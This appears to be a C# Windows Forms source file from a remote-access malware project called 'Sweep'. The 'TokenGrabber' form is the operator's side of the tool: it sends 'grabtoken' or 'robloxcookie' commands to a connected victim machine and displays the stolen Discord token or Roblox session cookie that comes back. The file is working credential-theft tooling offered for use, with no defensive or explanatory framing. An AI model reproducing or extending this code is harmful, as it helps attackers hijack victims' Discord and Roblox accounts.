using LazyServer;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Sweep.Forms
{
    public partial class TokenGrabber : Form
    {
        public LazyServerHost serverHost;
        public string connid;

        public string mode = "discord";
        public string grabcmd = "grabtoken";
        public TokenGrabber()
        {
            InitializeComponent();

            
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            
        }

        private async void grab_Click(object sender, EventArgs e)
        {
            token.ForeColor = Color.Blue;
            token.Text = "Waiting for token...";
            await serverHost.SendMessageToClient(connid, new JObject {
                ["command"] = grabcmd
            }.ToString());
        }

        private void TokenGrabber_Load(object sender, EventArgs e)
        {
            switch (mode) {
                case "roblox":
                    this.Text = "Roblox Grabber";
                    using (var bmp = global::Sweep.Properties.Resources.roblox) // This is a Bitmap
                    {
                        IntPtr hIcon = bmp.GetHicon();
                        this.Icon = Icon.FromHandle(hIcon);
                        grabcmd = "robloxcookie";
                        token.Text = "Roblox Cookie will appear here...\nClick grab button to start.";
                    }

                    break;
            };

            serverHost.MessageReceived += (s, e) => {
                try
                {
                    var msg = JObject.Parse(e.Message);

                    switch ((string)msg["msg"])
                    {
                        case "token":
                            if (e.ClientId == connid)
                            {
                                void settext() {
                                    token.ForeColor = Color.Green;
                                    token.Text = "Found token: " + (string)msg["body"];
                                }

                                token.Invoke((Action)settext);
                                
                            }
                            ;
                            break;
                        case "blox":
                            if (e.ClientId == connid)
                            {
                                void settext()
                                {
                                    token.ForeColor = Color.Green;
                                    token.Text = "Found token: " + (string)msg["body"];
                                }

                                token.Invoke((Action)settext);

                            }
                            ;
                            break;
                    }
                }
                catch (Exception ex) {
                    Console.WriteLine(ex.Message);
                }
                ;
            };
        }
    }
}
